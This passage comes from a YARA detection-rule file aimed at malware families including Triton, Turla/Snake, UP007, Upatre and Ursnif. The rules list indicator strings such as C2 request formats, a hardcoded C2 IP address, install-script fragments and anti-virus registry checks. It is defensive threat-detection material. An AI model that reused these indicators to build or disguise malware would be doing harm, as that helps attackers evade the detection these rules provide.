Mailsearcher\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Marc Salinas @Bondey_m\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"MALW_mailsercher_trickbot_module\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str_mails_01 = \"mailsearcher\"\n        $str_mails_02 = \"handler\"\n        $str_mails_03 = \"conf\"\n        $str_mails_04 = \"ctl\"\n        $str_mails_05 = \"SetConf\"\n        $str_mails_06 = \"file\"\n        $str_mails_07 = \"needinfo\"\n        $str_mails_08 = \"mailconf\"\n\n    condition:\n        all of ($str_mails_*)\n}\n\nrule TRITON_ICS_FRAMEWORK\n{\n    meta:\n        description = \"Triton attack framework\"\n        threat_names = \"Triton\"\n        ref = \"https://www.fireeye.com/blog/threat-research/2017/12/attackers-deploy-new-ics-attack-framework-triton.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"nicholas.carr @itsreallynick\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"TRITON_ICS_FRAMEWORK\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $python_compiled = \".pyc\" nocase ascii wide\n        $python_module_01 = \"__module__\" nocase ascii wide\n        $python_module_02 = \"<module>\" nocase ascii wide\n        $python_script_01 = \"import Ts\" nocase ascii wide\n        $python_script_02 = \"def ts_\" nocase ascii wide\n        $py_cnames_01 = \"TS_cnames.py\" nocase ascii wide\n        $py_cnames_02 = \"TRICON\" nocase ascii wide\n        $py_cnames_03 = \"TriStation \" nocase ascii wide\n        $py_cnames_04 = \" chassis \" nocase ascii wide\n        $py_tslibs_01 = \"GetCpStatus\" nocase ascii wide\n        $py_tslibs_03 = \" sequence\" nocase ascii wide\n        $py_tslibs_04 = /import Ts(Hi|Low|Base)[^:alpha:]/ nocase ascii wide\n        $py_tslibs_05 = /module\\s?version/ nocase ascii wide\n        $py_tslibs_07 = \"prog_cnt\" nocase ascii wide\n        $py_tsbase_01 = \"TsBase.py\" nocase ascii wide\n        $py_tsbase_02 = \".TsBase(\" nocase ascii wide\n        $py_tshi_01 = \"TsHi.py\" nocase ascii wide\n        $py_tshi_02 = \"keystate\" nocase ascii wide\n        $py_tshi_03 = \"GetProjectInfo\" nocase ascii wide\n        $py_tshi_04 = \"GetProgramTable\" nocase ascii wide\n        $py_tshi_05 = \"SafeAppendProgramMod\" nocase ascii wide\n        $py_tslow_01 = \"TsLow.py\" nocase ascii wide\n        $py_tslow_02 = \"print_last_error\" ascii nocase wide\n        $py_tslow_03 = \".TsLow(\" ascii nocase wide\n        $py_tslow_05 = \" TCM found\" nocase ascii wide\n        $py_crc_01 = \"crc.pyc\" nocase ascii wide\n        $py_crc_02 = \"CRC16_MODBUS\" ascii wide\n        $py_crc_03 = \"Kotov Alaxander\" nocase ascii wide\n        $py_crc_04 = \"CRC_CCITT_XMODEM\" ascii wide\n        $py_crc_05 = \"crc16ret\" ascii wide\n        $py_crc_06 = \"CRC16_CCITT_x1D0F\" ascii wide\n        $py_crc_07 = /CRC16_CCITT[^_]/ ascii wide\n        $py_sh_01 = \"sh.pyc\" nocase ascii wide\n        $py_keyword_01 = \" FAILURE\" ascii wide\n        $py_keyword_02 = \"symbol table\" nocase ascii wide\n        $py_TRIDENT_01 = \"inject.bin\" ascii nocase wide\n        $py_TRIDENT_02 = \"imain.bin\" ascii nocase wide\n\n    condition:\n        2 of ($python_*) and 7 of ($py_*) and filesize < 3MB\n}\n\nrule Triton_trilog\n{\n    meta:\n        description = \"Triton APT malware - file trilog.exe\"\n        ref = \"https://goo.gl/vtQoCQ\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Triton_trilog\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"inject.bin\" ascii\n        $s2 = \"PYTHON27.DLL\" fullword ascii\n        $s3 = \"payload\" ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 60KB and all of them\n}\n\nrule TrumpBot : MALW\n{\n    meta:\n        description = \"TrumpBot malware\"\n        classifications = \"Bot\"\n        threat_names = \"TrumpBot\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Joan Soriano / @joanbtl\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"TrumpBot\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $string = \"trumpisdaddy\"\n        $ip = \"198.50.154.188\"\n\n    condition:\n        all of them\n}\n\nrule Turla_APT_srsvc\n{\n    meta:\n        description = \"Turla / Snake malware\"\n        ref = \"https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case\"\n        classifications = \"Trojan\"\n        threat_names = \"Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Turla_APT_srsvc\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"SVCHostServiceDll.dll\" fullword ascii\n        $s2 = \"msimghlp.dll\" fullword wide\n        $s3 = \"srservice\" fullword wide\n        $s4 = \"ModStart\" fullword ascii\n        $s5 = \"ModStop\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 20KB and (1 of ($x*) or all of ($s*))) or (all of them)\n}\n\nrule Turla_APT_Malware_Gen1\n{\n    meta:\n        description = \"Turla / Snake malware\"\n        ref = \"https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case\"\n        classifications = \"Trojan\"\n        threat_names = \"Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Turla_APT_Malware_Gen1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"too long data for this type of transport\" fullword ascii\n        $x2 = \"not enough server resources to complete operation\" fullword ascii\n        $x3 = \"Task not execute. Arg file failed.\" fullword ascii\n        $x4 = \"Global\\\\MSCTF.Shared.MUTEX.ZRX\" fullword ascii\n        $s1 = \"peer has closed the connection\" fullword ascii\n        $s2 = \"tcpdump.exe\" fullword ascii\n        $s3 = \"windump.exe\" fullword ascii\n        $s4 = \"dsniff.exe\" fullword ascii\n        $s5 = \"wireshark.exe\" fullword ascii\n        $s6 = \"ethereal.exe\" fullword ascii\n        $s7 = \"snoop.exe\" fullword ascii\n        $s8 = \"ettercap.exe\" fullword ascii\n        $s9 = \"miniport.dat\" fullword ascii\n        $s10 = \"net_password=%s\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 2000KB and (2 of ($x*) or 8 of ($s*))) or (12 of them)\n}\n\nrule Turla_APT_Malware_Gen2\n{\n    meta:\n        description = \"Turla / Snake malware\"\n        ref = \"https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case\"\n        classifications = \"Trojan\"\n        threat_names = \"Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Turla_APT_Malware_Gen2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Internal command not support =((\" fullword ascii\n        $x2 = \"L|-1|AS_CUR_USER:OpenProcessToken():%d, %s|\" fullword ascii\n        $x3 = \"L|-1|CreateProcessAsUser():%d, %s|\" fullword ascii\n        $x4 = \"AS_CUR_USER:OpenProcessToken():%d\" fullword ascii\n        $x5 = \"L|-1|AS_CUR_USER:LogonUser():%d, %s|\" fullword ascii\n        $x6 = \"L|-1|try to run dll %s with user priv|\" fullword ascii\n        $x7 = \"\\\\\\\\.\\\\Global\\\\PIPE\\\\sdlrpc\" fullword ascii\n        $x8 = \"\\\\\\\\%s\\\\pipe\\\\comnode\" fullword ascii\n        $x9 = \"Plugin dll stop failed.\" fullword ascii\n        $x10 = \"AS_USER:LogonUser():%d\" fullword ascii\n        $s1 = \"MSIMGHLP.DLL\" fullword wide\n        $s2 = \"msimghlp.dll\" fullword ascii\n        $s3 = \"ximarsh.dll\" fullword ascii\n        $s4 = \"msximl.dll\" fullword ascii\n        $s5 = \"INTERNAL.dll\" fullword ascii\n        $s6 = \"\\\\\\\\.\\\\Global\\\\PIPE\\\\\" fullword ascii\n        $s7 = \"ieuser.exe\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 2000KB and (1 of ($x*) or 5 of ($s*))) or (10 of them)\n}\n\nrule Turla_APT_Malware_Gen3\n{\n    meta:\n        description = \"Turla / Snake malware\"\n        ref = \"https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case\"\n        classifications = \"Trojan\"\n        threat_names = \"Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Turla_APT_Malware_Gen3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"\\\\\\\\.\\\\pipe\\\\sdlrpc\" fullword ascii\n        $x2 = \"WaitMutex Abandoned %p\" fullword ascii\n        $x3 = \"OPER|Wrong config: no port|\" fullword ascii\n        $x4 = \"OPER|Wrong config: no lastconnect|\" fullword ascii\n        $x5 = \"OPER|Wrong config: empty address|\" fullword ascii\n        $x6 = \"Trans task %d obj %s ACTIVE fail robj %s\" fullword ascii\n        $x7 = \"OPER|Wrong config: no auth|\" fullword ascii\n        $x8 = \"OPER|Sniffer '%s' running... ooopppsss...|\" fullword ascii\n        $s1 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\5.0\\\\User Agent\\\\Post Platform\" fullword ascii\n        $s2 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\5.0\\\\User Agent\\\\Pre Platform\" fullword ascii\n        $s3 = \"www.yahoo.com\" fullword ascii\n        $s4 = \"MSXIML.DLL\" fullword wide\n        $s5 = \"www.bing.com\" fullword ascii\n        $s6 = \"%s: http://%s%s\" fullword ascii\n        $s7 = \"/javascript/view.php\" fullword ascii\n        $s8 = \"Task %d failed %s,%d\" fullword ascii\n        $s9 = \"Mozilla/4.0 (compatible; MSIE %d.0; \" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 2000KB and (1 of ($x*) or 6 of ($s*))) or (10 of them)\n}\n\nrule WaterBug_turla_dll\n{\n    meta:\n        description = \"Turla / Snake malware\"\n        ref = \"http://www.symantec.com/connect/blogs/turla-spying-tool-targets-governments-and-diplomats\"\n        classifications = \"Trojan\"\n        threat_names = \"Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Symantec Security Response\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"WaterBug_turla_dll\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = /([A-Za-z0-9]{2,10}_){,2}Win32\\.dll\\x00/\n\n    condition:\n        pe.exports(\"ee\") and $a\n}\n\nrule turla_dropper\n{\n    meta:\n        description = \"Turla malware dropper\"\n        ref = \"https://github.com/reed1713, http://info.baesystemsdetica.com/rs/baesystems/images/snake_whitepaper.pdf\"\n        classifications = \"Trojan\"\n        threat_names = \"Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"turla_dropper\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $type = \"Microsoft-Windows-Security-Auditing\"\n        $eventid = \"4688\"\n        $data = \"AppData\\\\Local\\\\Temp\\\\rsys.exe\"\n        $type1 = \"Service Control Manager\"\n        $eventid1 = \"7036\"\n        $data1 = \"RPC Endpoint Locator\"\n        $data2 = \"running\"\n        $type2 = \"Service Control Manager\"\n        $eventid2 = \"7045\"\n        $data3 = \"RPC Endpoint Locator\"\n        $data4 = \"user mode service\"\n        $data5 = \"auto start\"\n\n    condition:\n        ($type and $eventid and $data) or ($type1 and $eventid1 and $data1 and $data2 and $type2 and $eventid2 and $data3 and $data4 and $data5)\n}\n\nrule SnakeTurla_Malware_May17_1\n{\n    meta:\n        description = \"Turla / Snake malware\"\n        ref = \"https://goo.gl/QaOh4V\"\n        classifications = \"Trojan\"\n        threat_names = \"Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"SnakeTurla_Malware_May17_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"/Users/vlad/Desktop/install/install/\" fullword ascii\n\n    condition:\n        (uint16(0) == 0xfacf and filesize < 200KB and all of them)\n}\n\nrule SnakeTurla_Malware_May17_2\n{\n    meta:\n        description = \"Turla / Snake malware\"\n        ref = \"https://goo.gl/QaOh4V\"\n        classifications = \"Trojan\"\n        threat_names = \"Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"SnakeTurla_Malware_May17_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"b_openssl: oops - number of mutexes is 0\" fullword ascii\n        $s2 = \"networksetup -get%sproxy Ethernet\" fullword ascii\n        $s3 = \"012A04DECBC441e49C527B2798F54CA7LOG_NAMED_PIPE_NAME\" fullword ascii\n\n    condition:\n        (uint16(0) == 0xfacf and filesize < 6000KB and all of them)\n}\n\nrule SnakeTurla_Malware_May17_3\n{\n    meta:\n        description = \"Turla / Snake malware\"\n        ref = \"https://goo.gl/QaOh4V\"\n        classifications = \"Trojan\"\n        threat_names = \"Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"SnakeTurla_Malware_May17_3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Addy Symonds1\" ascii\n        $x2 = \"com.addy.InstallAdobeFlash\" ascii\n\n    condition:\n        (uint16(0) == 0xfacf and filesize < 3000KB and all of them)\n}\n\nrule SnakeTurla_Malware_May17_4\n{\n    meta:\n        description = \"Turla / Snake malware\"\n        ref = \"https://goo.gl/QaOh4V\"\n        classifications = \"Trojan\"\n        threat_names = \"Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"SnakeTurla_Malware_May17_4\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Install Adobe Flash Player.app/com.adobe.updatePK\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x4b50 and filesize < 5000KB and all of them)\n}\n\nrule SnakeTurla_Installd_SH\n{\n    meta:\n        description = \"Turla / Snake malware\"\n        ref = \"https://goo.gl/QaOh4V\"\n        classifications = \"Trojan\"\n        threat_names = \"Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"SnakeTurla_Installd_SH\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"PIDS=`ps cax | grep installdp\" ascii\n        $s2 = \"${SCRIPT_DIR}/installdp ${FILE}\" ascii\n\n    condition:\n        (uint16(0) == 0x2123 and filesize < 20KB and all of them)\n}\n\nrule SnakeTurla_Install_SH\n{\n    meta:\n        description = \"Turla / Snake malware\"\n        ref = \"https://goo.gl/QaOh4V\"\n        classifications = \"Trojan\"\n        threat_names = \"Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"SnakeTurla_Install_SH\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"${TARGET_PATH}/installd.sh\" ascii\n        $s2 = \"$TARGET_PATH2/com.adobe.update.plist\" ascii\n\n    condition:\n        (uint16(0) == 0x2123 and filesize < 20KB and all of them)\n}\n\nrule UP007_file_set\n{\n    meta:\n        description = \"UP007 malware service files\"\n        threat_names = \"UP007\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"dubseven_file_set\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $file1 = \"\\\\Microsoft\\\\Internet Explorer\\\\conhost.exe\"\n        $file2 = \"\\\\Microsoft\\\\Internet Explorer\\\\dll2.xor\"\n        $file3 = \"\\\\Microsoft\\\\Internet Explorer\\\\HOOK.DLL\"\n        $file4 = \"\\\\Microsoft\\\\Internet Explorer\\\\main.dll\"\n        $file5 = \"\\\\Microsoft\\\\Internet Explorer\\\\nvsvc.exe\"\n        $file6 = \"\\\\Microsoft\\\\Internet Explorer\\\\SBieDll.dll\"\n        $file7 = \"\\\\Microsoft\\\\Internet Explorer\\\\mon\"\n        $file8 = \"\\\\Microsoft\\\\Internet Explorer\\\\runas.exe\"\n\n    condition:\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and 3 of ($file*)\n}\n\nrule UP007_dropper_registry_checks\n{\n    meta:\n        description = \"UP007 malware dropper registry checks\"\n        threat_names = \"UP007\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"dubseven_dropper_registry_checks\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $reg1 = \"SOFTWARE\\\\360Safe\\\\Liveup\"\n        $reg2 = \"Software\\\\360safe\"\n        $reg3 = \"SOFTWARE\\\\kingsoft\\\\Antivirus\"\n        $reg4 = \"SOFTWARE\\\\Avira\\\\Avira Destop\"\n        $reg5 = \"SOFTWARE\\\\rising\\\\RAV\"\n        $reg6 = \"SOFTWARE\\\\JiangMin\"\n        $reg7 = \"SOFTWARE\\\\Micropoint\\\\Anti-Attack\"\n\n    condition:\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and all of ($reg*)\n}\n\nrule UP007_dropper_dialog_remains\n{\n    meta:\n        description = \"UP007 malware dialogs\"\n        threat_names = \"UP007\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"dubseven_dropper_dialog_remains\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $dia1 = \"fuckMessageBox 1.0\" wide\n        $dia2 = \"Rundll 1.0\" wide\n\n    condition:\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and any of them\n}\n\nrule UP007_maindll_mutex\n{\n    meta:\n        description = \"UP007 malware mutex\"\n        threat_names = \"UP007\"\n        ref = \"https://citizenlab.org/2016/04/between-hong-kong-and-burma/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"maindll_mutex\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $mutex = \"h31415927tttt\"\n\n    condition:\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $mutex\n}\n\nrule Upatre_Hazgurut\n{\n    meta:\n        description = \"Upatre downloader\"\n        ref = \"https://weankor.vxstream-sandbox.com/sample/6b857ef314938d37997c178ea50687a281d8ff9925f0c4e70940754643e2c0e3?environmentId=7\"\n        classifications = \"Trojan, Downloader\"\n        threat_names = \"Upatre\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Upatre_Hazgurut\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a1 = \"barcod\" fullword ascii\n        $s0 = \"msports.dll\" fullword ascii\n        $s1 = \"nddeapi.dll\" fullword ascii\n        $s2 = \"glmf32.dll\" fullword ascii\n        $s3 = \"<requestedExecutionLevel level=\\\"requireAdministrator\\\" uiAccess=\\\"false\\\">\" fullword ascii\n        $s4 = \"cmutil.dll\" fullword ascii\n        $s5 = \"mprapi.dll\" fullword ascii\n        $s6 = \"glmf32.dll\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1500KB and $a1 in (0 .. 4000) and all of ($s*)\n}\n\nrule Ursnif\n{\n    meta:\n        description = \"Ursnif Banking Trojan\"\n        ref = \"https://www.ccn-cert.cni.es/informes/informes-ccn-cert-publicos.html\"\n        classifications = \"Banking Trojan\"\n        threat_names = \"Ursnif\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"CCN-CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"GoziRule\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        // c.o.o.k.i.e.s...s.q.l.i.t.e.-.j.o.u.r.n.a.l...OPERA.EXE.\n        $ = {63 00 6F 00 6F 00 6B 00 69 00 65 00 73 00 2E 00 73 00 71 00 6C 00 69 00 74 00 65 00 2D 00 6A 00 6F 00 75 00 72 00 6E 00 61 00 6C 00 00 00 4F 50 45 52 41 2E 45 58 45 00}\n\n    condition:\n        all of them\n}\n\nrule Ursnif_Gen_C2_Format\n{\n    meta:\n        author = \"VMRay Labs\"\n        description = \"C2 format string of multiple Ursnif variants\"\n        threat_names = \"Ursnif\"\n        classifications = \"Banking Trojan\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n\n    strings:\n        $ = \"soft=\"\n        $ = \"version=%\"\n        $ = \"&user=%\"\n        $ = \"&server=%\"\n        $ = \"&id=%\"\n        $ = \"&crc=%\"\n        $ = \"&name=%\"\n        $ = \"&type=%\"\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and 5 of them\n}\n\nrule Ursnif_ISFB3_PDB\n{\n    meta:\n        author = \"VMRay Labs\"\n        description = \"Ursnif, ISFB v3 variant PDB path\"\n        classifications = \"Banking Trojan\"\n        threat_names = \"Ursnif, ISFB v3\"\n        ref = \"https://www.vmray.com/cyber-security-blog/analyzing-ursnif-behavior-malware-sandbox/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        sample = \"53f7d917ad9ebf5b7d2ccc1a835083bc0c0b92cc69ee584703ea6e4345f5c457\"\n\n    strings:\n        $pdb_path = \"c:\\\\isfb3\\\\release\\\\client.pdb\" fullword\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and any of them\n}\n\nrule Ursnif_Action_A_C2_Format\n{\n    meta:\n        author = \"VMRay Labs\"\n        description = \"C2 format string of Ursnif, Action.A variant\"\n        classifications = \"Banking Trojan\"\n        threat_names = \"Ursnif,Ursnif.Action.A\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        sample = \"6d1452e0dd2789d6e8322aa0f03d84b96fa5a0540e20e5b924c2e794ba5796ad\"\n\n    strings:\n        $positive_0 = \"&action=%08x\"\n        $positive_1 = \"&ip=%s\"\n        $positive_2 = \"&name=%s\"\n        $positive_3 = \"&os=%s\"\n        $positive_4 = \"&time=%lu\"\n        $positive_5 = \"&type=%u\"\n        $positive_6 = \"&uptime=%u\"\n        $positive_7 = \"Mozilla/5.0\"\n        $positive_8 = \"soft=%u&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x\"\n        $negative_0 = \"&action=%u\"\n        $negative_1 = \"&arc=%u\"\n        $negative_2 = \"&crc=%08x\"\n        $negative_3 = \"&group=%u\"\n        $negative_4 = \"&guid=%08x%08x%08x%08x\"\n        $negative_5 = \"&id=%x\"\n        $negative_6 = \"&user=%s\"\n        $negative_7 = \"(KHTML, like Gecko)\"\n        $negative_8 = \"(Windows NT %u.%u%s)\"\n        $negative_9 = \"(Windows NT %u.%u%s; Trident/7.0; rv:11.0)\"\n        $negative_10 = \"(Windows NT %u.%u%s; rv:40.0.0)\"\n        $negative_11 = \"(Windows NT %u.%u%s; rv:51.0)\"\n        $negative_12 = \"(Windows NT %u.%u%s; rv:54.0)\"\n        $negative_13 = \"(Windows NT %u.%u;%s rv:50.0)\"\n        $negative_14 = \"(compatible; MSIE 8.0; Windows NT %u.%u%s)\"\n        $negative_15 = \"AppleWebKit/537.36\"\n        $negative_16 = \"Chrome/64.0.3282.71\"\n        $negative_17 = \"Content-Disposition: form-data; name=\\\"%s\\\"\"\n        $negative_18 = \"Firefox/40.0.0\"\n        $negative_19 = \"Firefox/50.0\"\n        $negative_20 = \"Firefox/51.0\"\n        $negative_21 = \"Firefox/54.0\"\n        $negative_22 = \"Mozilla/4.0\"\n        $negative_23 = \"Safari/537.36\"\n        $negative_24 = \"soft=1&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x\"\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and all of ($positive_*)\n        and not any of ($negative_*)\n}\n\nrule Ursnif_Action_B_C2_Format\n{\n    meta:\n        author = \"VMRay Labs\"\n        description = \"C2 format string of Ursnif, Action.B variant\"\n        classifications = \"Banking Trojan\"\n        threat_names = \"Ursnif,Ursnif.Action.B\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        sample = \"22dac731e2238e9a02fc35dd10e503c655d88f649ec79b74c62b164e48ecb3ec\"\n\n    strings:\n        $positive_0 = \"&action=%u\"\n        $positive_1 = \"&ip=%s\"\n        $positive_2 = \"&name=%s\"\n        $positive_3 = \"&os=%s\"\n        $positive_4 = \"&time=%lu\"\n        $positive_5 = \"&type=%u\"\n        $positive_6 = \"&uptime=%u\"\n        $positive_7 = \"Mozilla/5.0 (Windows NT %u.%u%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.71 Safari/537.36\"\n        $positive_8 = 